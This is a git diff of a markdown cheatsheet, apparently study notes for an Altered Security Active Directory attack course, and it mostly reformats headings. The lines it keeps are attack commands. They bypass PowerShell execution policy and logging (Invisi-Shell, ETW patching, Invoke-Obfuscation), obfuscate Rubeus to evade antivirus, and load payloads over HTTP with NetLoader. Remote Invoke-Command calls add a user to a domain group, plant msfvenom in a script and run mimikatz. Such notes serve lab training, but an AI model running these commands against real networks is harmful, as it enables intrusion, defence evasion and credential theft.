@@ -11,7 +11,7 @@ tags: [Cheatsheet, Study Notes, Altered Security]
 
 >   PowerShell is NOT `powershell.exe`. It is the `System.Management.Automation.dll`
 
-### Bypassing Execution Policy
+##### Bypassing Execution Policy
 
 >   It is NOT a security measure, it is present to prevent user from accidently executing scripts.
 
@@ -21,7 +21,7 @@ tags: [Cheatsheet, Study Notes, Altered Security]
     -   `powershell –encodedcommand`
     -   `$env:PSExecutionPolicyPreference="bypass"`
 
-### Bypassing PowerShell Security with [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
+##### Bypassing PowerShell Security with [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
 
 ```powershell
 # With admin privileges:
@@ -114,8 +114,6 @@ PS:\> $w = 'System.Manag';$r = '65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 
 
 ### Patching Event Tracing For Windows
 
-By disabling or manipulating ETW, we can prevent security tools from logging our actions or tracking our movement within a system.
-
 ##### Use Invoke-Obfuscation
 
 ```powershell
@@ -130,7 +128,9 @@ Invoke-Obfuscation> ENCODING\5
 # Paste encrypted payload
 ```
 
-### Offensive .NET - AV Bypass Ofbuscation
+### Offensive.NET
+
+##### Offensive .NET - AV Bypass Ofbuscation
 
 ```powershell
 # Check malicious binary with ThreatCheck (https://github.com/rasta-mouse/ThreatCheck)
@@ -145,7 +145,7 @@ C:\> Threatcheck.exe -f Rubeus.exe
 C:\> Threatcheck.exe -f RubeusObfuscated.exe
 ```
 
-### Offensive .NET - Payload Delivery
+##### Offensive .NET - Payload Delivery
 
 ```powershell
 # We can use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.
@@ -158,7 +158,7 @@ C:\Users\Public\> AssemblyLoad.exe http://10.10.10.10/Loader.exe -path http://10
 
 # II. Domain Enumeration
 
-### PowerView Basic Enumeration
+##### PowerView Basic Enumeration
 
 ```powershell
 # Get current domain
@@ -230,7 +230,7 @@ Invoke-FileFinder -Verbose
 Get-NetFileServer
 ```
 
-### PowerView GPO Enumeration
+##### PowerView GPO Enumeration
 
 ```powershell
 # Get list of GPO in current domain.
@@ -255,7 +255,7 @@ Get-NetOU -FullData
 Get-NetGPO -ADSPath '<output from (Get-NetOU <ou>).gplink'
 ```
 
-### PowerView ACL Enumeration
+##### PowerView ACL Enumeration
 
 ```powershell
 # Get the ACLs associated with the specified object (groups)
@@ -277,7 +277,7 @@ Invoke-ACLScanner -ResolveGUIDs
 Get-PathAcl -Path "\\dcorp-dc.abc.xyz.local\sysvol"
 ```
 
-### PowerView Trust Enumeration
+##### PowerView Trust Enumeration
 
 ```powershell
 # Get a list of all domain trusts for the current domain
@@ -364,9 +364,7 @@ Invoke-PrivEsc
 
 # IV. Lateral Movement
 
-### Cmdlets [ `New-PSSession` ]
-
-###### 
+##### Cmdlets [ `New-PSSession` ]
 
 ```powershell
 # Connect to a PS-Session of a remote user
@@ -385,58 +383,36 @@ Enter-PSSession -Session $sess
 Will list current process
 ```
 
-### Cmdlets [ `Invoke-Command` ]
-
-##### Execute Stateful commands using Invoke-Command ( persistence )
+##### Cmdlets [ `Invoke-Command` ]
 
 ```powershell
+# Execute Stateful commands using Invoke-Command ( persistence )
 $sess = New-PSSession -Computername dcorp-adminsrv.abc.xyz.local
 Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
 Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
-```
 
-##### Display allowed commands we can execute on remote machine
-
-```powershell
+# Display allowed commands we can execute on remote machine
 Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command {get-command}
-```
 
-##### Write File using `ScriptBlock`
-
-```powershell
+# Write File using `ScriptBlock`
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}
-```
 
-##### Edit file using `ScriptBlock`
-
-```powershell
+# Edit file using `ScriptBlock`
 Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {((cat "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\msfvenom.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
-```
 
-##### Command execution using command and `ScriptBlock`
-
-```powershell
+# Command execution using command and `ScriptBlock`
 Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -command {whoami}
 Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -ScriptBlock {whoami}
 Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -command {whoami}
 Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -ScriptBlock {whoami}
-```
 
-##### File execution using `ScriptBlock`
-
-```powershell
+# File execution using `ScriptBlock`
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock{"C:\temp\mimikatz.exe"}
-```
 
-##### File execution using `FilePath`
-
-```powershell
+# File execution using `FilePath`
 Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -FilePath "C:\temp\mimikatz.exe"
-```
 
-##### Language Mode
-
-```powershell
+# Language Mode
 Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
 ```
 
